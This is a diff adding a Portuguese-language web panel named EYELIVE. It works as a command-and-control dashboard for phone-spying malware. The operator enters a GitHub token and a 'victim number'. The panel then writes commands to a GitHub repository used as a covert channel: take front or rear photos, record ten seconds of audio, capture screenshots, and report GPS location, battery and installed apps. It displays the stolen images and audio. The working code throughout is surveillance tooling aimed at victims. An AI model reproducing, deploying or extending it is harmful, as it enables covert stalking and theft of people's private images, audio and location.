@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>EYELIVE - Painel</title>
+    <style>
+        :root{--bg:#0d0d0d;--card:#1a1a1a;--gold:#ffd700;--green:#4caf50;--red:#f44336;--text:#fff;--sub:#aaa}
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;font-size:14px}
+        .header{background:#000;padding:15px;text-align:center;border-bottom:2px solid var(--gold)}
+        .header h1{font-size:1.3em;color:var(--gold)}
+        .container{max-width:500px;margin:0 auto;padding:20px}
+        .card{background:var(--card);border:1px solid #2a2a2a;border-radius:12px;padding:20px;margin:15px 0}
+        input{width:100%;padding:14px;background:#000;border:1px solid #333;color:#fff;border-radius:8px;font-size:1.1em;text-align:center;margin:10px 0}
+        .btn{width:100%;padding:14px;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-size:1em;margin:5px 0}
+        .btn-gold{background:var(--gold);color:#000}.btn-green{background:var(--green);color:#fff}.btn-red{background:var(--red);color:#fff}
+        .result{background:#000;border:1px solid #333;border-radius:8px;padding:15px;margin:10px 0;white-space:pre-wrap;max-height:400px;overflow-y:auto;font-size:.8em;color:#fff}
+        img{max-width:100%;border-radius:8px;margin:10px 0}
+        .cmd-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+        a{color:var(--gold)}
+    </style>
+</head>
+<body>
+<div class="header"><h1>EYELIVE</h1></div>
+<div class="container">
+    <div class="card">
+        <p style="color:var(--sub);text-align:center;margin-bottom:10px">
+            Cole seu <a href="https://github.com/settings/tokens" target="_blank">Token GitHub</a> 
+            (classic, marque "repo")
+        </p>
+        <input type="password" id="token" placeholder="ghp_..." value="">
+        <p style="color:var(--sub);text-align:center">📱 Número da Vítima</p>
+        <input type="text" id="phone" placeholder="+55 11999999999">
+        <button class="btn btn-gold" onclick="status()">📊 Status</button>
+        <div class="cmd-grid">
+            <button class="btn btn-green" onclick="cmd('foto_frontal')">📸 Foto Frontal</button>
+            <button class="btn btn-green" onclick="cmd('foto_traseira')">📸 Foto Traseira</button>
+            <button class="btn btn-red" onclick="cmd('audio')">🎤 Audio 10s</button>
+            <button class="btn btn-gold" onclick="cmd('screenshot')">📱 Screenshot</button>
+        </div>
+    </div>
+    <div class="result" id="result">👆 Digite o token e o número, depois clique em Status</div>
+</div>
+<script>
+var REPO = 'gynbetfc/eyelive';
+
+function getDeviceId(phone){
+    var hash = 0;
+    for(var i=0;i<phone.length;i++){hash=((hash<<5)-hash)+phone.charCodeAt(i);hash|=0}
+    return Math.abs(hash).toString(16).substring(0,12);
+}
+
+function getToken(){
+    return document.getElementById('token').value.trim() || localStorage.getItem('eyelive_token') || '';
+}
+
+function saveToken(){
+    var t = document.getElementById('token').value.trim();
+    if(t) localStorage.setItem('eyelive_token', t);
+}
+
+async function sendCommand(phone,cmd){
+    saveToken();
+    var token = getToken();
+    if(!token){alert('Cole seu Token GitHub primeiro!');return}
+    
+    var deviceId = getDeviceId(phone);
+    var comando = {cmd:cmd,target:phone,time:new Date().toISOString()};
+    var content = btoa(JSON.stringify(comando));
+    
+    try{
+        var url = 'https://api.github.com/repos/'+REPO+'/contents/comandos/'+deviceId+'.json';
+        var r = await fetch(url,{
+            method:'PUT',
+            headers:{'Authorization':'token '+token,'Accept':'application/vnd.github.v3+json'},
+            body:JSON.stringify({message:'Comando',content:content,branch:'main'})
+        });
+        
+        if(r.ok){
+            document.getElementById('result').innerHTML='⏳ Aguardando resposta...';
+            setTimeout(async function(){
+                var respUrl = 'https://api.github.com/repos/'+REPO+'/contents/respostas/'+deviceId+'.json';
+                var r2 = await fetch(respUrl,{headers:{'Authorization':'token '+token,'Accept':'application/vnd.github.v3+json'}});
+                if(r2.ok){
+                    var data = await r2.json();
+                    var resp = JSON.parse(atob(data.content));
+                    showResult(resp);
+                }else{
+                    document.getElementById('result').innerHTML='⏳ Nenhuma resposta ainda. O bot está rodando?';
+                }
+            },10000);
+        }else{
+            var err = await r.json();
+            document.getElementById('result').innerHTML='❌ Erro: '+err.message;
+        }
+    }catch(e){
+        document.getElementById('result').innerHTML='❌ Erro de conexao';
+    }
+}
+
+function status(){sendCommand(document.getElementById('phone').value,'status')}
+function cmd(c){sendCommand(document.getElementById('phone').value,c)}
+
+function showResult(resp){
+    var h='';
+    if(resp.cmd=='status' && resp.result){
+        try{
+            var d = JSON.parse(resp.result);
+            h+='<p>📱 '+d.phone+' | 🕐 '+d.time+'</p>';
+            h+='<p>🔋 '+d.bateria+'</p>';
+            h+='<p>📍 '+JSON.stringify(d.gps)+'</p>';
+            h+='<p>📱 Apps: '+(d.apps||[]).join(', ')+'</p>';
+        }catch(e){h+=resp.result}
+    }else if(resp.result && resp.result.length>100){
+        h+='<p>✅ ' + resp.cmd + ' recebido!</p>';
+        if(resp.cmd.includes('foto')||resp.cmd.includes('screen')){
+            h+='<img src="data:image/jpeg;base64,'+resp.result+'">';
+        }else if(resp.cmd=='audio'){
+            h+='<audio controls src="data:audio/aac;base64,'+resp.result+'"></audio>';
+        }
+    }else{
+        h+='<p>'+JSON.stringify(resp)+'</p>';
+    }
+    document.getElementById('result').innerHTML=h;
+}
+
+// Carregar token salvo
+window.onload=function(){
+    var t = localStorage.getItem('eyelive_token');
+    if(t) document.getElementById('token').value = t;
+}
+</script>
+</body>
+</html>
